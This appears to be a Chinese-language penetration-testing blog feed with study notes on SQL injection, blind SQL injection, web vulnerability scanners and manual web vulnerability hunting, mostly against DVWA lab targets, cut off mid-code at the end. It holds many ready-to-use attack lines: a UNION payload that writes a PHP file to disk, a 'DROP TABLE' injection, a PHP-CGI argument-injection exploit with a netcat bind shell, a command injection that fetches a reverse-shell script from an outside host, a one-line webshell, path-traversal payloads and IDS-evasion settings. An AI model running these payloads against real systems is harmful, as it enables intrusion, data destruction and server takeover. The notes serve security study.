</code></pre><p>新思路:编写服务端代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null, &#39;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID &#x3D; $_POST[&quot;userID&quot;]; $first_name &#x3D; $_POST[&quot;first_name&quot;]; $last_name &#x3D; $_POST[&quot;last_name&quot;]; $username &#x3D; $_POST[&quot;username&quot;]; $avatar &#x3D; $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password &#x3D; &quot;123&quot;; $sql&#x3D;&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;userID&quot; value&#x3D;&quot;33&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;first_name&quot; value&#x3D;&quot;fh&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;last_name&quot; value&#x3D;&quot;y&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;avatar&quot; value&#x3D;&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;&#x2F;form&gt;&#39; INTO DUMPFILE &#39;&#x2F;tmp&#x2F;user.php&#39; --</span><br></pre></td></tr></table></figure><h4 id="无权读取information-schema库-拒绝union-order-by语句"><a href="#无权读取information-schema库-拒绝union-order-by语句" class="headerlink" title="无权读取information_schema库/拒绝union,order by语句"></a><strong>无权读取information_schema库/拒绝union,order by语句</strong></h4><pre><code>猜列名: &apos; and column is null--+    Burp suite 自动猜列名    find / -name *column*.txt        #寻找字典路径猜当前表表名: &apos; and table.user is null--+猜库里其它表: &apos; and (select dvwa from table)&gt;0--+列表对应关系: &apos; and users.user is null--+猜字段内容:    &apos; or user=&apos;admin            &apos; or user like &apos;%a%猜账号对应密码:    &apos; or user=&apos;admin&apos; and password=&apos;5f4dcc3b5aa765d61d8327deb882cf99</code></pre><h4 id="当数据库可写"><a href="#当数据库可写" class="headerlink" title="当数据库可写"></a><strong>当数据库可写</strong></h4><pre><code>&apos;; update users set user=&apos;yuanfh&apos; where user=&apos;admin    注入失败,sql客户端工具的问题    http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html&apos;; INSERT INTO users (&apos; user_id&apos;,&apos; first_name&apos;,&apos; last_name&apos;,&apos; user&apos;,&apos;password&apos;,&apos;avatar&apos;) VALUES (‘35&apos;,‘fh&apos;,‘yuan&apos;,‘yfh&apos;,&apos;5f4dcc3b5aa765d61d8327deb882cf99&apos;,&apos;OK&apos;);--+ &apos;; DROP TABLE users; -- xp_cmdshell / 存储过程</code></pre><ul><li>SQLi没有通用的方法,掌握原理,了解各种数据库特性</li></ul><p>Medium难度级别</p><pre><code>mysql_real_escape_string()    PHP 4 &gt;= 4.3.0, PHP5PHP 5.5.5.0 已经弃用此函数PHP 7.0.0 已经删除此函数,代之以 MySQLi,PDO_MySQL 转义符,对下列字符转义\x00,\n,\r,\,&apos;,&quot;,\x1a</code></pre><p>high难度级别</p><pre><code>mysql_real_escape_string()stripslashes()    去除&quot;\&quot;is_numeric()    判断是否是数字</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Burpsuit </tag>
            
            <tag> 联合查询 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL盲注</title>
      <link href="/2014/05/03/Web_Attacks/SQL_Injection/SQL%E7%9B%B2%E6%B3%A8/"/>
      <url>/2014/05/03/Web_Attacks/SQL_Injection/SQL%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a><strong>SQL盲注</strong></h3></blockquote><ul><li>不显示数据库内建的报错信息</li><li>内建的报错信息帮助开发人员发现和修复问题</li><li>报错信息提供关于系统的大量有用信息</li><li>当程序员隐藏了数据库内建报错信息,替换为通用的错误提示,sql注入将无法依据报错信息判断注入语句的执行结果,既盲</li></ul><p><strong>思路:既然无法基于报错信息判断结果,基于逻辑真假的不同结果来判断</strong></p><pre><code>1&apos; and 1=1--+1&apos; and 1=2--+1&apos; order by 2--+    真1&apos; order by 5--+    假1&apos; union select 1,2--+ 1&apos; union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--+ 1&apos; and 1=0 union select null,table_name from information_schema.tables# 1&apos; and 1=0 union select null,table_name from information_schema.columns where table_name=&apos;users&apos; #</code></pre><h4 id="无权读取information-schema库-拒绝union-order-by-语句"><a href="#无权读取information-schema库-拒绝union-order-by-语句" class="headerlink" title="无权读取information_schema库 / 拒绝union, order by 语句"></a><strong>无权读取information_schema库 / 拒绝union, order by 语句</strong></h4><pre><code>猜列名:    1&apos; and user is not null--+猜当前表表名: 1&apos; and (select count(*) from table)&gt;0--+列表对应关系: 1&apos; and users.user is not null--+猜字段内容:   1&apos; and user=&apos;admin            1&apos; or user like &apos;%a%猜账号对应密码:    2&apos; or user=&apos;admin&apos; and password=&apos;5f4dcc3b5aa765d61d8327deb882cf99 </code></pre><h4 id="Burpsuit-自动化猜解内容"><a href="#Burpsuit-自动化猜解内容" class="headerlink" title="Burpsuit 自动化猜解内容"></a><strong>Burpsuit 自动化猜解内容</strong></h4><p>思路:<br>    真实案例:某电商网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1.1.1.1&#x2F;goods.php?cnt&#x3D;1&amp;goodsid&#x3D;123</span><br><span class="line">and 1&#x3D;1--+#显示一包纸巾</span><br><span class="line">and 1&#x3D;2--+#显示一袋洗衣粉</span><br><span class="line"></span><br><span class="line">1&#39; and ORD(MID((VERSION()),1,1))&amp;1&gt;0--+</span><br><span class="line">CURRENT_USER()̵DATABASE() </span><br><span class="line">MID(ColumnName, Start [, Length]) </span><br><span class="line"> ORD(string)#ASCLL码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> SQL盲注 </tag>
            
            <tag> Burpsuit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用WEB综合扫描程序简介</title>
      <link href="/2014/03/30/Web_Attacks/%E5%B8%B8%E7%94%A8WEB%E7%BB%BC%E5%90%88%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F%E7%AE%80%E4%BB%8B/"/>
      <url>/2014/03/30/Web_Attacks/%E5%B8%B8%E7%94%A8WEB%E7%BB%BC%E5%90%88%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>环境准备</strong></p><ul><li>Metasploitable2</li><li>DVWA</li></ul><p><strong>侦察</strong><br>    <code>Httrack</code>        #镜像目标网站到本地<br>        减少与目标系统交互</p><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a><strong>扫描工具</strong></h3><ul><li>Nikto</li><li>Vega</li><li>Skipfish</li><li>W3af</li><li>Arachni</li><li>Owasp-zap</li><li>AWVS</li><li>APPSCAN</li></ul><p><del>Web Penetration Testing with Kali Linux        #Read Book,有点过时</del></p><blockquote><h4 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a><strong>Nikto</strong></h4></blockquote><p>Perl语言开发的开源web安全扫描器<br>软件版本<br>搜索存在安全隐患的文件<br>服务器配置漏洞<br>Web Application层面的安全隐患</p><pre><code>避免404误判    很多服务器不遵守RFC标准,对不存在的对象返回200响应码    依据响应文件内容判断,不同扩展名的文件404响应内容不同    去除时间信息后的内容取MD5值    -no404nikto -list-plugins        #插件nikto -update    cirt.net    http://cirt.net/nikto/UPDATES/nikto -host http://1.1.1.1nikto -host 192.168.1.1 -ssl -port 443,8443,995nikto -host host.txt                    #扫描多个目标,目标地址存放到文件nmap -p80 192.168.254.0/24 -oG - | nikto -host -    #结合nmap扫描nikto -host 192.168.254.115 -useproxy http://localhost:8087-vhost</code></pre><p><strong>Nikto-interactive</strong></p><pre><code>Space - report current scan status    #查看扫描状态v - verbose mode on/off     #查看正在扫描的信息d - debug mode on/off        #查看更详细的信息e - error reporting on/off    p - progress reporting on/off    #查看并计算扫描总体进度r - redirect display on/off        #只看状态码为重定向的扫描c - cookie display on/off        a - auth display on/offq - quitN - next hostP - Pause        #暂停扫描</code></pre><p><strong>nikto配置文件</strong></p><pre><code>/etc/nikto.confSTATIC-COOKIE=&quot;cookie1&quot;=&quot;cookie value&quot;,&quot;cookie2&quot;=&quot;cookie value&quot;-evasion:使用LibWhisker中对IDS的躲避技术,可使用以下几种类型    1.随机URL编码(非UTF-8方式)    2.自选择路径(/./)    3.过早结束的URL    4.优先考虑长随机字符串    5.参数欺骗    6.使用TAB作为命令的分隔符    7.使用变化的URL    8.使用Windows路径分隔符&quot;\&quot;nikto -host 192.168.254.115 -evasion 1678        #躲避类型可多选</code></pre><blockquote><h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a><strong>vega</strong></h4></blockquote><p>GUI<br>JAVA编写的开源Web扫描器<br>扫描模式<br>代理模式<br>爬站,处理表单,注入测试<br>支持SSL: <code>http://vega/ca.crt</code></p><blockquote><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a><strong>skipfish</strong></h4></blockquote><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快<br>  多路单线程,全异步网络I/O,消除内存管理和调度开销<br>  启发式自动内容识别</li><li>误报较低<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">skipfish -o test http:&#x2F;&#x2F;1.1.1.1</span><br><span class="line">skipfish -o test @url.txt</span><br><span class="line">skipfish -o test -S complet.wl -W a.wl http:&#x2F;&#x2F;1.1.1.1#使用字典扫描</span><br><span class="line">dpkg -L skipfish | grep wl#查询字典路径</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl#字典路径</span><br><span class="line">-I :只检查包含&#39;string&#39;的URL</span><br><span class="line">-X :不检查包含&#39;string&#39;的URL#logout</span><br><span class="line">-K :不对指定参数进行Fuzz测试</span><br><span class="line">-D :跨站点爬另外一个域</span><br><span class="line">-l :每秒最大请求数</span><br><span class="line">-m :每IP最大并发连接数</span><br><span class="line">skipfish -o skipfishtest -l 10 -m 10 -I &#x2F;dvwa&#x2F; -S &#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl http:&#x2F;&#x2F;192.168.254.115</span><br><span class="line">--config :指定配置文件</span><br><span class="line"></span><br><span class="line">身份认证</span><br><span class="line">skipfish -A user:pass -o test http:&#x2F;&#x2F;1.1.1.1</span><br><span class="line">skipfish -C &quot;name&#x3D;val&quot; -o test http:&#x2F;&#x2F;1.1.1.1#cookie登录</span><br><span class="line">表单登录</span><br><span class="line">skipfish -o a --auth-form http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;login.php --auth-form-target http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;index.php -I dvwa http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;</span><br><span class="line"></span><br><span class="line">扫描结束太快</span><br><span class="line">有可能触发了目标站点的连接数限制,降低 -m -l 数值</span><br></pre></td></tr></table></figure></li></ul><blockquote><h4 id="w3af-Web-Application-Attack-and-Audit-Framework"><a href="#w3af-Web-Application-Attack-and-Audit-Framework" class="headerlink" title="w3af(Web Application Attack and Audit Framework)"></a><strong>w3af</strong>(Web Application Attack and Audit Framework)</h4></blockquote><p>基于python语言开发<br>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">10大类近150个plugin</span><br><span class="line">audit#审计</span><br><span class="line">infrastructure#基础架构</span><br><span class="line">grep#被动扫描</span><br><span class="line">evasion#逃避目标的waf,ids检测</span><br><span class="line">mangle#基于正则替换特征字符串,用于注入</span><br><span class="line">auth#身份认证</span><br><span class="line">bruteforce#暴力破解</span><br><span class="line">output#扫描结果output输出,提供调用</span><br><span class="line">crawl#爬虫</span><br><span class="line">attack#exploit攻击利用模块</span><br></pre></td></tr></table></figure><ul><li><p>安装(kali自带版本执行扫描时挂死)    ps aux | grep w3af | kill pid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y python-pip w3af</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;andresriancho&#x2F;w3af.git</span><br><span class="line">cd w3af</span><br><span class="line">.&#x2F;w3af_console (.&#x2F;w3af_gui)</span><br><span class="line">apt-get build-dep python-lxml</span><br><span class="line">.&#x2F;tmp&#x2F;w3af_dependency_install.sh</span><br></pre></td></tr></table></figure><p>  <strong>升级</strong></p><pre><code>git pull</code></pre><p>  <strong>创建快捷方式</strong></p><pre><code>/usr/share/appllcations/w3af.desktop</code></pre><p>  <strong>用户接口</strong></p><pre><code>ConsoleGuiAPI</code></pre><p>  <strong>w3af_console</strong></p><pre><code>help            #显示可用指令plugin            #进入plugin子命令    Help        #显示可用指令    list audit    #列出audit类所有插件    audit sqli xss    #选择使用的audit插件http-settings / misc-settings    #全局配置    help    view        #查看可配置的参数    set            #设置参数    back        #回到上一级命令Profiles    save as self-contained    save as test self-containedTarget    set target http://1.1.1.1/StartScript    script/*.w3af</code></pre></li></ul><p><strong>w3af–身份认证</strong></p><pre><code>HTTP Basic        #基于base64编码的明文密码传输,win03NTLM            #windows独有的身份认证FormCookie            #双因素身份认证 / anti-CSRF tokens</code></pre><p><strong>w3af–截断代理</strong></p><pre><code>截断代理HTTP header file (另类的身份认证方法)W3af不支持客户端技术(Javascript,Flash,Java applet等)截断代理手动爬网    spider_men    ouptut.export_requests    http://127.7.7.7/spider_man$terminate         #终止spider_mancrawl.import_results    base64</code></pre><p><strong>w3af–其它特性</strong></p><pre><code>exploitFuzzy Requests    Numbers from 0 to 4:$range(5)$    First ten letters:$string.lowercase[:10]$    The words spam and eggs:$[&apos;spam&apos;,&apos;eggs&apos;]$    The content of a file:$[l.strip() for l in file (&apos;input.txt&apos;)]$Cluster responses</code></pre><blockquote><h4 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a><strong>Arachni</strong></h4></blockquote><pre><code>Kali自带了旧的arachni阉割版安装    http://www.arachni-scanner.com/download/#Linux    tar xvf arachni.tar.gz    cd arachni    cd bin      ./arachni_web    http://localhost:9292/        admin@admin.admin    / administratorProfile    Import    Export    NewDispatcher    #分布式扫描部署    ./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1        #创建实例Grid    ./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111Scan</code></pre><blockquote><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a><strong>OWASP_ZAP</strong></h4><p>Zed attack proxy<br>WEB Application集成渗透测试和漏洞挖掘工具<br>开源免费跨平台简单易用</p></blockquote><pre><code>截断代理主动,被动扫描Fuzzy,暴力破解API    http://zap/Persist SessionMode--Safe,Protected,Standard,ATTACK升级add-onsScan policyAnti CSRF Tokenshttps--CAScope / Contexts / filterHttp Sessions--defauit session tokens &amp; site session tokensNote / tagPassive scan标准扫描工作流程    设置代理    手动爬网    自动爬网    主动扫描</code></pre><blockquote><h4 id="AWVS-Acunetix-Web-Vulnerability-Scanner"><a href="#AWVS-Acunetix-Web-Vulnerability-Scanner" class="headerlink" title="AWVS (Acunetix Web Vulnerability Scanner)"></a><strong>AWVS</strong> (Acunetix Web Vulnerability Scanner)</h4></blockquote><p>自动手动爬网,支持AJAX,JavaScript<br>AcuSensor灰盒测试<br>    发现爬网无法发现文件<br>    额外的漏洞扫描<br>    可发现存在漏洞的源码行号<br>    支持PHP,.NET(不获取源码的情况下注入已编译.NET)<br>生成PCI,27001标准和规报告<br>网络扫描<br>    FTP,DNS,SMTP,IMAP,POP3,SSH,SNMP,Telnet<br>    集成openvas扫描漏洞</p><p>爬站<br>子域扫描器<br>发现扫描器<br>SQL注入验证<br>Http editor<br>Http sniffer<br>Http Fuzzer<br>身份认证测试<br>结果比较</p><p>AcuSensor安装<br>    生成agent文件 acu_phpaspect.php(PHP5.0以上)<br>    将文件拷贝到目标服务器,web程序可以访问到目录<br>    修改.htaccess或php.ini<br>        <code>php_value auto_prepend_file &#39;[path to acu_phpaspect.php file]&#39;</code></p><blockquote><h4 id="APPSCAN"><a href="#APPSCAN" class="headerlink" title="APPSCAN"></a><strong>APPSCAN</strong></h4></blockquote><ul><li><p>Watchfire APPScan,2007年被IBM收购,成为IBM APPScan</p></li><li><p>扫描过程</p><ul><li>探索阶段</li><li>测试阶段</li></ul></li><li><p>第一个过程发现新的URL地址,下一个扫描过程自动开始</p></li><li><p>向导方式</p></li><li><p>完全配置</p></li><li><p>Glass box</p><ul><li>相当于Acusensor</li><li>Agent收集服务器端源代码信息和其他数据</li><li>主持JAVA,.NET两种平台</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
          <category> Scanner </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nikto </tag>
            
            <tag> Vega </tag>
            
            <tag> Skipfish </tag>
            
            <tag> W3af </tag>
            
            <tag> Arachni </tag>
            
            <tag> zap </tag>
            
            <tag> AWVS </tag>
            
            <tag> APPSCAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动挖掘Web漏洞</title>
      <link href="/2014/03/11/Web_Attacks/%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98Web%E6%BC%8F%E6%B4%9E/"/>
      <url>/2014/03/11/Web_Attacks/%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98Web%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a><strong>手动漏洞挖掘</strong></h4><ul><li><p>默认安装</p><ul><li>Windows默认安装漏洞</li><li>phpMyAdmin/setup</li><li>Ubuntu/Debian 默认安装PHP5-cgi</li><li>可直接访问 /cgi-bin/php5 和 /cgi-bin/php(爬不出来的目录)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;php?-d allow_url_include&#x3D;on -d safe_mode&#x3D;off -d suhosin.simutation&#x3D;on -d disable_functions&#x3D;&quot;&quot; -d open_basedir&#x3D;onne -d auto_prepend_file&#x3D;php:&#x2F;&#x2F;input -d cgi.force_redirect&#x3D;0 -d cgi.redirect_status_env&#x3D;0 -n HTTP&#x2F;1.1</span><br><span class="line">Host:123</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo system(&#39;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe | nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe&#39;);#PHP正向shell</span><br><span class="line">?&gt;#POST部分进行URL编码后再请求</span><br><span class="line"></span><br><span class="line">nc 192.168.254.115 4444</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST http:&#x2F;&#x2F;192.168.20.10&#x2F;phpMyAdmin&#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&#x2F;&#x2F;input HTTP&#x2F;1.1</span><br><span class="line">Host:192.168.20.10</span><br><span class="line">&lt;?php</span><br><span class="line">passthru(&#39;id&#39;);</span><br><span class="line">die();</span><br><span class="line">?&gt;</span><br><span class="line">#使用Burp Repeater重放POST请求</span><br><span class="line"></span><br><span class="line">#PHP反弹shell</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php</span><br><span class="line">nc -nvvlp 1234</span><br><span class="line">File</span><br><span class="line">Whereis</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">写入webshell</span><br><span class="line">echo &quot;&lt;?php \$cmd&#x3D;\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; &#x2F;var&#x2F;www&#x2F;3.php</span><br></pre></td></tr></table></figure></li></ul></li><li><p>身份认证</p><ul><li><p>常用弱口令/基于字典的密码爆破</p></li><li><p>锁定账号</p></li><li><p>信息收集</p><ul><li>手机号</li><li>密码错误提示信息</li></ul></li><li><p>密码嗅探</p></li><li><p>会话sessionID</p><ul><li>XSS/cookie importer</li><li>SessionID in URL</li><li>嗅探</li><li>SessionID 长期不变/永久不变</li><li>SessionID 生成算法<ul><li>Sequencer</li><li>私有算法</li><li>预判下一次登录时生成的SessionID</li><li>登出后返回测试</li></ul></li><li>密码找回</li></ul></li></ul></li><li><p><strong>漏洞挖掘原则</strong></p><ul><li>所有变量</li><li>所有头<ul><li>Cookie中的变量</li></ul></li><li>逐个变量删除</li></ul></li><li><p><strong>漏洞的本质</strong></p><ul><li>数据与指令的混淆</li><li>对用户输入信息过滤不严判断失误,误将指令当数据</li></ul></li></ul><p><strong>命令执行漏洞</strong></p><ul><li><p>应用程序开发者直接调用操作系统功能</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">;#同时执行其它命令</span><br><span class="line">&amp;&amp;#执行成功后才执行其它命令</span><br><span class="line">&amp;#同时执行其它命令</span><br><span class="line">|#管道符</span><br><span class="line">|| #当前一个命令执行失败,则执行管道符后的命令</span><br><span class="line">查看源码,过滤用户输入</span><br><span class="line">;mkfifo &#x2F;tmp&#x2F;pipe;sh &#x2F;tmp&#x2F;pipe | nc -nlp 4444 &gt; &#x2F;tmp&#x2F;pipe#正向shell</span><br><span class="line">;curl http:&#x2F;&#x2F;1.1.1.1&#x2F;php-revers-shell.php#反向shell</span><br><span class="line">nc nvvlp 1234</span><br></pre></td></tr></table></figure></li><li><p>Directory traversal(目录遍历漏洞) / File include (有区别/没区别)</p><ul><li>目录权限限制不严/文件包含<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</span><br><span class="line">allow_url_include&#x3D;on#远程文件包含</span><br></pre></td></tr></table></figure></li></ul></li><li><p>应用程序功能操作文件,限制不严时导致访问WEB目录以外的文件</p><ul><li>读,写文件,远程执行代码</li></ul></li><li><p>特征但不绝对</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;a.php</span><br><span class="line">?home&#x3D;b.html</span><br><span class="line">?file&#x3D;content</span><br></pre></td></tr></table></figure></li><li><p>经典测试方法</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">?home&#x3D;main.cgi</span><br><span class="line">?page&#x3D;http:&#x2F;&#x2F;www.a.com&#x2F;1.php</span><br><span class="line">http:&#x2F;&#x2F;1.1.1.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;dir&#x2F;file.txt</span><br></pre></td></tr></table></figure></li><li><p>编码绕过字符过滤</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;.&quot;&quot;%00&quot;#绕过文件扩展名过滤</span><br><span class="line">?file&#x3D;a.doc%00.php</span><br></pre></td></tr></table></figure><ul><li>使用多种编码尝试</li></ul></li><li><p>不同操作系统的路径特征字符</p><ul><li><p>类unix系统</p><ul><li>根目录:/</li><li>目录层级分隔符:/</li></ul></li><li><p>Windows系统</p><ul><li>C:\</li><li>\或/</li></ul></li><li><p>编码</p><ul><li>url编码,双层url编码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%2e%2e%2f解码: ..&#x2F;</span><br><span class="line">%2e%2e%5c解码: ..\</span><br><span class="line">%252e%252e%255c2次解码: ..\</span><br><span class="line">Unicode&#x2F;UTF-8编码</span><br><span class="line">..%c0%af解码: ..&#x2F;</span><br><span class="line">..%u2216</span><br><span class="line">..%c1%9c解码 ..\</span><br></pre></td></tr></table></figure></li></ul></li><li><p>其它系统路径可能使用到的字符</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file.txt...</span><br><span class="line">file.txt&lt;spaces&gt;</span><br><span class="line">file.txt&quot;&quot;&quot;&quot;</span><br><span class="line">file.txt&lt;&lt;&lt;&gt;&gt;&gt;&lt;</span><br><span class="line">.&#x2F;.&#x2F;.&#x2F;file.txt</span><br><span class="line">nonexistant&#x2F;..&#x2F;file.txt</span><br><span class="line">UNC路径</span><br><span class="line">\\1.1.1.1\path\to\file.txt#windows文件共享</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>本地文件包含漏洞</strong>(LFI)</p><ul><li>查看文件</li><li>代码执行  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo 